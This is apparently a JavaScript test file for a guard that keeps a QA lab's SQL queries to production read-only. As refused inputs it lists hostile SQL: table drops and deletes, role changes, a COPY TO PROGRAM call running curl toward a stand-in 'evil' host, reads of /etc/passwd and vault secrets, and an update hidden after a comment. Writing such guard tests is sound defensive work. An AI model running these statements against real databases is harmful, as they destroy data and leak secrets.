import test from 'node:test';
import assert from 'node:assert/strict';
import { assertReadOnlySql, stripSqlNoise } from '../../qa-lab/lib/management-api.mjs';
import { CATALOG_QUERIES, CONFIG_ROWS_QUERY } from '../../qa-lab/lib/catalog-sql.mjs';

// The QA lab reads production's catalog through the Management API. The only
// thing standing between a typo and a production write is this guard (plus the
// READ ONLY transaction every query is wrapped in), so it is tested on its own.

test('every catalog query the lab sends to production passes the guard', () => {
  for (const [name, sql] of Object.entries(CATALOG_QUERIES)) {
    assert.doesNotThrow(() => assertReadOnlySql(sql), name);
  }
  assert.doesNotThrow(() => assertReadOnlySql(CONFIG_ROWS_QUERY));
});

test('the guard returns the statement as written, not the stripped copy it checks', () => {
  const sql = "select jsonb_build_object('a', 1) as r -- note\n;";
  assert.equal(assertReadOnlySql(sql), "select jsonb_build_object('a', 1) as r -- note");
});

test('writes, DDL, settings and multi-statement text are refused', () => {
  const refused = [
    'delete from public.profiles',
    'update public.access_policy_settings set enforcement_enabled = false',
    'insert into public.app_admins values (1)',
    'select 1; delete from public.profiles',
    'with gone as (delete from public.profiles returning *) select count(*) from gone',
    'create table x (a int)',
    'drop table public.profiles',
    'grant all on public.profiles to anon',
    'truncate public.profiles',
    'alter role postgres password $$x$$',
    'set role postgres',
    'select set_config($$role$$, $$postgres$$, false)',
    'copy public.profiles to program $$curl evil$$',
    'do $$ begin perform 1; end $$',
    'call public.some_procedure()',
    'select nextval($$public.user_events_id_seq$$)',
    'select cron.schedule($$x$$, $$* * * * *$$, $$select 1$$)',
    'select net.http_post(url := $$https://example.test$$)',
    'lock table public.profiles',
    'vacuum public.profiles',
  ];
  for (const sql of refused) assert.throws(() => assertReadOnlySql(sql), /read-only guard/, sql);
});

test('secret values are never read, even with a plain SELECT', () => {
  assert.throws(() => assertReadOnlySql('select decrypted_secret from vault.decrypted_secrets'), /decrypted_secret/);
  assert.throws(() => assertReadOnlySql("select pg_read_file('/etc/passwd')"), /pg_read_file/);
});

test('keywords inside literals and comments do not trip the guard; hidden statements do', () => {
  assert.doesNotThrow(() => assertReadOnlySql("select 'delete from x; drop table y' as r"));
  assert.doesNotThrow(() => assertReadOnlySql('select 1 as r /* update */'));
  assert.doesNotThrow(() => assertReadOnlySql('select "update" from (select 1 as "update") t'));
  assert.throws(() => assertReadOnlySql("select 1 as r; /* */ update t set a = 'b'"), /read-only guard/);
  assert.equal(stripSqlNoise("select 'a''b' -- c\n, $x$ drop $x$"), "select ''  \n, ''");
});
